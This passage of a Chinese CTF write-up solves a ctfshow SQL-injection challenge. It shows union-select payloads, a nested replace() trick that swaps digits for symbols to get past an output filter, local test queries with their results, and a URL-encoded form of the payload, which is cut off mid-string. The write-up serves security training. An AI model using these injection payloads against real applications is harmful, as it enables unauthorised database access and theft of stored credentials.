<span class="line"><span style="color:#d4d4d4">      </span><span style="color:#9cdcfe">$ret</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'msg'</span><span style="color:#d4d4d4">]=</span><span style="color:#ce9178">'查询成功'</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">    }</span></span></code></pre></div></div></figure><p>可以进行尝试，如：</p><figure class="shiki sql"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">-</span><span style="color:#b5cea8">1</span><span style="color:#ce9178">' union select '</span><span style="color:#d4d4d4">a</span><span style="color:#ce9178">','</span><span style="color:#d4d4d4">b</span></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">#	如果是-</span><span style="color:#b5cea8">1</span><span style="color:#ce9178">' union select '</span><span style="color:#d4d4d4">a</span><span style="color:#ce9178">','</span><span style="color:#d4d4d4">b</span><span style="color:#ce9178">','</span><span style="color:#d4d4d4">c	则会失败</span></span></code></pre></div></div></figure><p>因为是 union 联合查询，需要保持和前面的语句是同样的 2 个句列。</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202301152044709.png" srcset="/img/loading/loading.gif" lazyload alt="image-20230115204404610"></p><p>可以发现 sql 语句是成功注入的，接着就开始想办法绕过这个匹配数字的正则，这里可以用笨办法也可以盲注尝试。</p><h4 id="解1数字字符替换replace"><a class="markdownIt-Anchor" href="#解1数字字符替换replace"></a> 解 1. 数字字符替换（replace）</h4><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202301152100380.png" srcset="/img/loading/loading.gif" lazyload alt="image-20230115210058286"></p><figure class="shiki sql"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4"># 因为0-9的数字在键盘上有对应的字符，比如：2对应@，所以可以尝试将所有数字替换成对应的字符。</span></span>
<span class="line"><span style="color:#d4d4d4"># 结合上述的试探，可以知道select </span><span style="color:#ce9178">'a'</span><span style="color:#d4d4d4">,</span><span style="color:#ce9178">'b	其中的这个b部分才是真正出flag的地方，我们需要在这里构造替换payload</span></span>
<span class="line"></span>
<span class="line"><span style="color:#ce9178">-1'</span><span style="color:#d4d4d4"> </span><span style="color:#569cd6">union</span><span style="color:#d4d4d4"> </span><span style="color:#569cd6">select</span><span style="color:#d4d4d4"> </span><span style="color:#ce9178">'a'</span><span style="color:#d4d4d4">,b.password </span><span style="color:#569cd6">from</span><span style="color:#d4d4d4"> ctfshow_user4 </span><span style="color:#569cd6">as</span><span style="color:#d4d4d4"> b </span><span style="color:#569cd6">where</span><span style="color:#d4d4d4"> b.username = </span><span style="color:#ce9178">'flag'</span><span style="color:#d4d4d4">;</span><span style="color:#6a9955">--+</span></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4"># 构造b.password部分：</span></span>
<span class="line"><span style="color:#dcdcaa">replace</span><span style="color:#d4d4d4">(b.password,</span><span style="color:#b5cea8">1</span><span style="color:#d4d4d4">,</span><span style="color:#ce9178">"!"</span><span style="color:#d4d4d4">)</span></span>
<span class="line"><span style="color:#dcdcaa">replace</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">replace</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">replace</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">replace</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">replace</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">replace</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">replace</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">replace</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">replace</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">replace</span><span style="color:#d4d4d4">(b.password,</span><span style="color:#b5cea8">0</span><span style="color:#d4d4d4">,</span><span style="color:#ce9178">")"</span><span style="color:#d4d4d4">),</span><span style="color:#b5cea8">9</span><span style="color:#d4d4d4">,</span><span style="color:#ce9178">"("</span><span style="color:#d4d4d4">),</span><span style="color:#b5cea8">8</span><span style="color:#d4d4d4">,</span><span style="color:#ce9178">"*"</span><span style="color:#d4d4d4">),</span><span style="color:#b5cea8">7</span><span style="color:#d4d4d4">,</span><span style="color:#ce9178">"&amp;"</span><span style="color:#d4d4d4">),</span><span style="color:#b5cea8">6</span><span style="color:#d4d4d4">,</span><span style="color:#ce9178">"^"</span><span style="color:#d4d4d4">),</span><span style="color:#b5cea8">5</span><span style="color:#d4d4d4">,</span><span style="color:#ce9178">"%"</span><span style="color:#d4d4d4">),</span><span style="color:#b5cea8">4</span><span style="color:#d4d4d4">,</span><span style="color:#ce9178">"$"</span><span style="color:#d4d4d4">),</span><span style="color:#b5cea8">3</span><span style="color:#d4d4d4">,</span><span style="color:#ce9178">"#"</span><span style="color:#d4d4d4">),</span><span style="color:#b5cea8">2</span><span style="color:#d4d4d4">,</span><span style="color:#ce9178">"@"</span><span style="color:#d4d4d4">),</span><span style="color:#b5cea8">1</span><span style="color:#d4d4d4">,</span><span style="color:#ce9178">"!"</span><span style="color:#d4d4d4">)</span></span></code></pre></div></div></figure><p>如果不确定是否构造正确可以去本地跑</p><figure class="shiki sql"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#569cd6">select</span><span style="color:#d4d4d4"> username,</span><span style="color:#569cd6">password</span><span style="color:#d4d4d4"> </span><span style="color:#569cd6">from</span><span style="color:#d4d4d4"> ctfshow_user4 </span><span style="color:#569cd6">where</span><span style="color:#d4d4d4"> username !=</span><span style="color:#ce9178">'flag'</span><span style="color:#d4d4d4"> </span><span style="color:#569cd6">and</span><span style="color:#d4d4d4"> id = </span><span style="color:#ce9178">'-1'</span><span style="color:#d4d4d4"> </span><span style="color:#569cd6">union</span><span style="color:#d4d4d4"> </span><span style="color:#569cd6">select</span><span style="color:#d4d4d4"> </span><span style="color:#ce9178">'a'</span><span style="color:#d4d4d4">,</span><span style="color:#dcdcaa">replace</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">replace</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">replace</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">replace</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">replace</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">replace</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">replace</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">replace</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">replace</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">replace</span><span style="color:#d4d4d4">(b.password,</span><span style="color:#b5cea8">0</span><span style="color:#d4d4d4">,</span><span style="color:#ce9178">")"</span><span style="color:#d4d4d4">),</span><span style="color:#b5cea8">9</span><span style="color:#d4d4d4">,</span><span style="color:#ce9178">"("</span><span style="color:#d4d4d4">),</span><span style="color:#b5cea8">8</span><span style="color:#d4d4d4">,</span><span style="color:#ce9178">"*"</span><span style="color:#d4d4d4">),</span><span style="color:#b5cea8">7</span><span style="color:#d4d4d4">,</span><span style="color:#ce9178">"&amp;"</span><span style="color:#d4d4d4">),</span><span style="color:#b5cea8">6</span><span style="color:#d4d4d4">,</span><span style="color:#ce9178">"^"</span><span style="color:#d4d4d4">),</span><span style="color:#b5cea8">5</span><span style="color:#d4d4d4">,</span><span style="color:#ce9178">"%"</span><span style="color:#d4d4d4">),</span><span style="color:#b5cea8">4</span><span style="color:#d4d4d4">,</span><span style="color:#ce9178">"$"</span><span style="color:#d4d4d4">),</span><span style="color:#b5cea8">3</span><span style="color:#d4d4d4">,</span><span style="color:#ce9178">"#"</span><span style="color:#d4d4d4">),</span><span style="color:#b5cea8">2</span><span style="color:#d4d4d4">,</span><span style="color:#ce9178">"@"</span><span style="color:#d4d4d4">),</span><span style="color:#b5cea8">1</span><span style="color:#d4d4d4">,</span><span style="color:#ce9178">"!"</span><span style="color:#d4d4d4">) </span><span style="color:#569cd6">from</span><span style="color:#d4d4d4"> ctfshow_user4 </span><span style="color:#569cd6">as</span><span style="color:#d4d4d4"> b </span><span style="color:#569cd6">where</span><span style="color:#d4d4d4"> b.username = </span><span style="color:#ce9178">'flag'</span><span style="color:#d4d4d4">;</span><span style="color:#6a9955">--+</span></span></code></pre></div></div></figure><p>这是我本地的表结构：</p><figure class="shiki sql"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">mysql&gt; </span><span style="color:#569cd6">select</span><span style="color:#d4d4d4"> * </span><span style="color:#569cd6">from</span><span style="color:#d4d4d4"> user;</span></span>
<span class="line"><span style="color:#d4d4d4">+</span><span style="color:#6a9955">----+----------+---------------------------+</span></span>
<span class="line"><span style="color:#d4d4d4">| id | username | </span><span style="color:#569cd6">password</span><span style="color:#d4d4d4">                  |</span></span>
<span class="line"><span style="color:#d4d4d4">+</span><span style="color:#6a9955">----+----------+---------------------------+</span></span>
<span class="line"><span style="color:#d4d4d4">|  </span><span style="color:#b5cea8">1</span><span style="color:#d4d4d4"> | </span><span style="color:#b5cea8">1</span><span style="color:#d4d4d4">        | </span><span style="color:#b5cea8">11</span><span style="color:#d4d4d4">                        |</span></span>
<span class="line"><span style="color:#d4d4d4">|  </span><span style="color:#b5cea8">2</span><span style="color:#d4d4d4"> | </span><span style="color:#b5cea8">2</span><span style="color:#d4d4d4">        | </span><span style="color:#b5cea8">5316516</span><span style="color:#d4d4d4">                   |</span></span>
<span class="line"><span style="color:#d4d4d4">|  </span><span style="color:#b5cea8">3</span><span style="color:#d4d4d4"> | flag     | flag{y0u_ar1_r1ally_g0od} |</span></span>
<span class="line"><span style="color:#d4d4d4">|  </span><span style="color:#b5cea8">4</span><span style="color:#d4d4d4"> | admin1   | flag_not_me               |</span></span>
<span class="line"><span style="color:#d4d4d4">+</span><span style="color:#6a9955">----+----------+---------------------------+</span></span>
<span class="line"><span style="color:#b5cea8">4</span><span style="color:#d4d4d4"> </span><span style="color:#569cd6">rows</span><span style="color:#d4d4d4"> </span><span style="color:#569cd6">in</span><span style="color:#d4d4d4"> </span><span style="color:#569cd6">set</span><span style="color:#d4d4d4"> (</span><span style="color:#b5cea8">0</span><span style="color:#d4d4d4">.</span><span style="color:#b5cea8">02</span><span style="color:#d4d4d4"> sec)</span></span></code></pre></div></div></figure><p>查询语句：</p><figure class="shiki sql"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#569cd6">select</span><span style="color:#d4d4d4"> username,</span><span style="color:#569cd6">password</span><span style="color:#d4d4d4"> </span><span style="color:#569cd6">from</span><span style="color:#d4d4d4"> user </span><span style="color:#569cd6">where</span><span style="color:#d4d4d4"> username !=</span><span style="color:#ce9178">'flag'</span><span style="color:#d4d4d4"> </span><span style="color:#569cd6">and</span><span style="color:#d4d4d4"> id = </span><span style="color:#ce9178">'-1'</span><span style="color:#d4d4d4"> </span><span style="color:#569cd6">union</span><span style="color:#d4d4d4"> </span><span style="color:#569cd6">select</span><span style="color:#d4d4d4"> </span><span style="color:#ce9178">'a'</span><span style="color:#d4d4d4">,</span><span style="color:#dcdcaa">replace</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">replace</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">replace</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">replace</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">replace</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">replace</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">replace</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">replace</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">replace</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">replace</span><span style="color:#d4d4d4">(b.password,</span><span style="color:#ce9178">"0"</span><span style="color:#d4d4d4">,</span><span style="color:#ce9178">")"</span><span style="color:#d4d4d4">),</span><span style="color:#ce9178">"9"</span><span style="color:#d4d4d4">,</span><span style="color:#ce9178">"("</span><span style="color:#d4d4d4">),</span><span style="color:#ce9178">"8"</span><span style="color:#d4d4d4">,</span><span style="color:#ce9178">"*"</span><span style="color:#d4d4d4">),</span><span style="color:#ce9178">"7"</span><span style="color:#d4d4d4">,</span><span style="color:#ce9178">"&amp;"</span><span style="color:#d4d4d4">),</span><span style="color:#ce9178">"6"</span><span style="color:#d4d4d4">,</span><span style="color:#ce9178">"^"</span><span style="color:#d4d4d4">),</span><span style="color:#ce9178">"5"</span><span style="color:#d4d4d4">,</span><span style="color:#ce9178">"%"</span><span style="color:#d4d4d4">),</span><span style="color:#ce9178">"4"</span><span style="color:#d4d4d4">,</span><span style="color:#ce9178">"$"</span><span style="color:#d4d4d4">),</span><span style="color:#ce9178">"3"</span><span style="color:#d4d4d4">,</span><span style="color:#ce9178">"#"</span><span style="color:#d4d4d4">),</span><span style="color:#ce9178">"2"</span><span style="color:#d4d4d4">,</span><span style="color:#ce9178">"@"</span><span style="color:#d4d4d4">),</span><span style="color:#ce9178">"1"</span><span style="color:#d4d4d4">,</span><span style="color:#ce9178">"!"</span><span style="color:#d4d4d4">) </span><span style="color:#569cd6">from</span><span style="color:#d4d4d4"> user </span><span style="color:#569cd6">as</span><span style="color:#d4d4d4"> b </span><span style="color:#569cd6">where</span><span style="color:#d4d4d4"> b.username = </span><span style="color:#ce9178">'flag'</span><span style="color:#d4d4d4">;</span></span></code></pre></div></div></figure><p>返回结果：</p><figure class="shiki sql"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4"># 预期：</span></span>
<span class="line"><span style="color:#d4d4d4">flag{y)u_ar!_r!ally_g)od}</span></span>
<span class="line"><span style="color:#d4d4d4"># 实际：</span></span>
<span class="line"><span style="color:#d4d4d4">+</span><span style="color:#6a9955">----------+---------------------------+</span></span>
<span class="line"><span style="color:#d4d4d4">| username | </span><span style="color:#569cd6">password</span><span style="color:#d4d4d4">                  |</span></span>
<span class="line"><span style="color:#d4d4d4">+</span><span style="color:#6a9955">----------+---------------------------+</span></span>
<span class="line"><span style="color:#d4d4d4">| a        | flag{y)u_ar!_r!ally_g)od} |</span></span>
<span class="line"><span style="color:#d4d4d4">+</span><span style="color:#6a9955">----------+---------------------------+</span></span>
<span class="line"><span style="color:#b5cea8">1</span><span style="color:#d4d4d4"> </span><span style="color:#569cd6">row</span><span style="color:#d4d4d4"> </span><span style="color:#569cd6">in</span><span style="color:#d4d4d4"> </span><span style="color:#569cd6">set</span><span style="color:#d4d4d4"> (</span><span style="color:#b5cea8">0</span><span style="color:#d4d4d4">.</span><span style="color:#b5cea8">04</span><span style="color:#d4d4d4"> sec)</span></span></code></pre></div></div></figure><p>理论可行开始尝试</p><figure class="shiki sql"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4"># payload</span></span>
<span class="line"><span style="color:#d4d4d4">-</span><span style="color:#b5cea8">1</span><span style="color:#ce9178">' union select '</span><span style="color:#d4d4d4">a</span><span style="color:#ce9178">',replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(b.password,"0",")"),"9","("),"8","*"),"7","&amp;"),"6","^"),"5","%"),"4","$"),"3","#"),"2","@"),"1","!") from ctfshow_user4 as b where b.username = '</span><span style="color:#d4d4d4">flag</span><span style="color:#ce9178">';--+</span></span></code></pre></div></div></figure><p>尝试之后发现并没有预期得到结果，于是抓包查看是否正确提交，最后发现我们的这个 payload 太长，并没有被提交完全，于是自己抓包重新提交：</p><figure class="shiki sql"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4"># payload</span></span>
<span class="line"><span style="color:#d4d4d4">%2d%</span><span style="color:#b5cea8">31</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">27</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">20</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">75</span><span style="color:#d4d4d4">%6e%</span><span style="color:#b5cea8">69</span><span style="color:#d4d4d4">%6f%6e%</span><span style="color:#b5cea8">20</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">73</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">65</span><span style="color:#d4d4d4">%6c%</span><span style="color:#b5cea8">65</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">63</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">74</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">20</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">27</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">61</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">27</span><span style="color:#d4d4d4">%2c%</span><span style="color:#b5cea8">72</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">65</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">70</span><span style="color:#d4d4d4">%6c%</span><span style="color:#b5cea8">61</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">63</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">65</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">28</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">72</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">65</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">70</span><span style="color:#d4d4d4">%6c%</span><span style="color:#b5cea8">61</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">63</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">65</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">28</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">72</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">65</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">70</span><span style="color:#d4d4d4">%6c%</span><span style="color:#b5cea8">61</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">63</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">65</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">28</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">72</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">65</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">70</span><span style="color:#d4d4d4">%6c%</span><span style="color:#b5cea8">61</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">63</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">65</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">28</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">72</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">65</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">70</span><span style="color:#d4d4d4">%6c%</span><span style="color:#b5cea8">61</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">63</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">65</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">28</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">72</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">65</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">70</span><span style="color:#d4d4d4">%6c%</span><span style="color:#b5cea8">61</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">63</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">65</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">28</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">72</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">65</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">70</span><span style="color:#d4d4d4">%6c%</span><span style="color:#b5cea8">61</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">63</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">65</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">28</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">72</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">65</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">70</span><span style="color:#d4d4d4">%6c%</span><span style="color:#b5cea8">61</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">63</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">65</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">28</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">72</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">65</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">70</span><span style="color:#d4d4d4">%6c%</span><span style="color:#b5cea8">61</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">63</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">65</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">28</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">72</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">65</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">70</span><span style="color:#d4d4d4">%6c%</span><span style="color:#b5cea8">61</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">63</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">65</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">28</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">62</span><span style="color:#d4d4d4">%2e%</span><span style="color:#b5cea8">70</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">61</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">73</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">73</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">77</span><span style="color:#d4d4d4">%6f%</span><span style="color:#b5cea8">72</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">64</span><span style="color:#d4d4d4">%2c%</span><span style="color:#b5cea8">22</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">30</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">22</span><span style="color:#d4d4d4">%2c%</span><span style="color:#b5cea8">22</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">29</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">22</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">29</span><span style="color:#d4d4d4">%2c%</span><span style="color:#b5cea8">22</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">39</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">22</span><span style="color:#d4d4d4">%2c%</span><span style="color:#b5cea8">22</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">28</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">22</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">29</span><span style="color:#d4d4d4">%2c%</span><span style="color:#b5cea8">22</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">38</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">22</span><span style="color:#d4d4d4">%2c%</span><span style="color:#b5cea8">22</span><span style="color:#d4d4d4">%2a%</span><span style="color:#b5cea8">22</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">29</span><span style="color:#d4d4d4">%2c%</span><span style="color:#b5cea8">22</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">37</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">22</span><span style="color:#d4d4d4">%2c%</span><span style="color:#b5cea8">22</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">26</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">22</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">29</span><span style="color:#d4d4d4">%2c%</span><span style="color:#b5cea8">22</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">36</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">22</span><span style="color:#d4d4d4">%2c%</span><span style="color:#b5cea8">22</span><span style="color:#d4d4d4">%5e%</span><span style="color:#b5cea8">22</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">29</span><span style="color:#d4d4d4">%2c%</span><span style="color:#b5cea8">22</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">35</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">22</span><span style="color:#d4d4d4">%2c%</span><span style="color:#b5cea8">22</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">25</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">22</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">29</span><span style="color:#d4d4d4">%2c%</span><span style="color:#b5cea8">22</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">34</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">22</span><span style="color:#d4d4d4">%2c%</span><span style="color:#b5cea8">22</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">24</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">22</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">29</span><span style="color:#d4d4d4">%2c%</span><span style="color:#b5cea8">22</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">33</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">22</span><span style="color:#d4d4d4">%2c%</span><span style="color:#b5cea8">22</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">23</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">22</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">29</span><span style="color:#d4d4d4">%2c%</span><span style="color:#b5cea8">22</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">32</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">22</span><span style="color:#d4d4d4">%2c%</span><span style="color:#b5cea8">22</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">40</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">22</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">29</span><span style="color:#d4d4d4">%2c%</span><span style="color:#b5cea8">22</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">31</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">22</span><span style="color:#d4d4d4">%2c%</span><span style="color:#b5cea8">22</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">21</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">22</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">29</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">20</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">66</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">72</span><span style="color:#d4d4d4">%6f%6d%</span><span style="color:#b5cea8">20</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">63</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">74</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">66</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">73</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">68</span><span style="color:#d4d4d4">%6f%</span><span style="color:#b5cea8">77</span><span style="color:#d4d4d4">%5f%</span><span style="color:#b5cea8">75</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">73</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">65</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">72</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">34</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">20</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">61</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">73</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">20</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">62</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">20</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">77</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">68</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">65</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">72</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">65</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">20</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">62</span><span style="color:#d4d4d4">%2e%</span><span style="color:#b5cea8">75</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">73</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">65</span><span 